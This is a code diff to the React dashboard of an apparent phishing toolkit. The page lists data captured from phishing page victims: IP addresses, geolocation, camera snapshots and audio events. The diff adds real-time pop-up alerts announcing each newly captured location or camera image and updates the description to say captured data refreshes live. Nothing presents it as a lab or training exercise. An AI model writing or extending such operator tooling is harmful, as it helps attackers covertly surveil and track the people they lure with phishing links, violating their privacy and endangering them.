@@ -1,14 +1,15 @@
 
 "use client";
+import { useEffect, useRef } from 'react';
 import { useLogs } from '@/contexts/LogContext';
 import { Button } from '@/components/ui/button';
-import { Textarea } from '@/components/ui/textarea';
 import { Card, CardContent, CardDescription, CardHeader, CardTitle } from '@/components/ui/card';
 import { PhishingLinkCard } from '@/components/dashboard/PhishingLinkCard';
 import { MapPin, Camera, Mic, Trash2, ListChecks, AlertTriangle } from 'lucide-react';
-import type { LogEntry } from '@/types';
+import type { LogEntry, LocationData, CameraData, AudioData } from '@/types';
 import { ScrollArea } from '@/components/ui/scroll-area';
 import Image from 'next/image';
+import { useToast } from '@/hooks/use-toast';
 
 
 const phishingCategories = [
@@ -49,14 +50,63 @@ const phishingCategories = [
 
 export default function DashboardPage() {
   const { logs, clearLogs, isLoading } = useLogs();
+  const { toast } = useToast();
+  const previousLatestLogIdRef = useRef<string | null>(null);
+  const isInitialLoadRef = useRef(true);
+
+  useEffect(() => {
+    if (isLoading) return; // Don't process logs until initial loading is done
+
+    if (logs.length === 0) {
+      previousLatestLogIdRef.current = null; // Reset if logs are cleared
+      if(isInitialLoadRef.current) isInitialLoadRef.current = false; // Mark initial load as done even if no logs
+      return;
+    }
+
+    const currentLatestLogId = logs[0].id;
+
+    if (isInitialLoadRef.current) {
+      previousLatestLogIdRef.current = currentLatestLogId;
+      isInitialLoadRef.current = false;
+      return; // Don't toast for initially loaded logs
+    }
+
+    if (currentLatestLogId !== previousLatestLogIdRef.current) {
+      const newLog = logs[0];
+      let toastTitle = "New Data Captured!";
+      let toastDescription = `Type: ${newLog.type}, IP: ${newLog.ip}`;
+
+      if (newLog.type === 'location') {
+        const locData = newLog.data as LocationData;
+        const city = locData.city || "Unknown City";
+        const country = locData.country || "Unknown Country";
+        toastTitle = "Location Data Captured!";
+        toastDescription = `From ${city}, ${country}. IP: ${newLog.ip}.`;
+      } else if (newLog.type === 'camera') {
+        toastTitle = "Camera Snapshot Captured!";
+        toastDescription = `Image captured from IP: ${newLog.ip}.`;
+      } else if (newLog.type === 'audio') {
+        toastTitle = "Audio Capture Simulated!";
+        toastDescription = `Audio event from IP: ${newLog.ip}.`;
+      }
+      
+      toast({
+        title: toastTitle,
+        description: toastDescription,
+        variant: "default",
+      });
+      previousLatestLogIdRef.current = currentLatestLogId;
+    }
+  }, [logs, isLoading, toast]);
+
 
   const formatLogData = (data: any, type: LogEntry['type']): React.ReactNode => {
-    if (type === 'camera' && data?.imageUrl) {
+    if (type === 'camera' && (data as CameraData)?.imageUrl) {
       return (
         <div className="my-2">
           <p className="font-medium">Captured Image:</p>
           <Image 
-            src={data.imageUrl} 
+            src={(data as CameraData).imageUrl} 
             alt="Captured from camera" 
             width={200} 
             height={150} 
@@ -65,6 +115,13 @@ export default function DashboardPage() {
           />
         </div>
       );
+    }
+    // For location, display city and country if available
+    if (type === 'location' && data) {
+        const locData = data as LocationData;
+        let displayData = {...locData};
+        // City and country are now directly in data, so JSON.stringify will show them
+        return <pre className="whitespace-pre-wrap break-all text-xs">{JSON.stringify(displayData, null, 2)}</pre>;
     }
     return <pre className="whitespace-pre-wrap break-all text-xs">{JSON.stringify(data, null, 2)}</pre>;
   };
@@ -78,7 +135,7 @@ export default function DashboardPage() {
             Captured Data Logs
           </CardTitle>
           <CardDescription>
-            View all data captured from phishing page interactions. This data is stored locally in your browser.
+            View all data captured from phishing page interactions. This data updates in real-time.
           </CardDescription>
         </CardHeader>
         <CardContent className="space-y-4">
@@ -133,4 +190,3 @@ export default function DashboardPage() {
     </div>
   );
 }
-
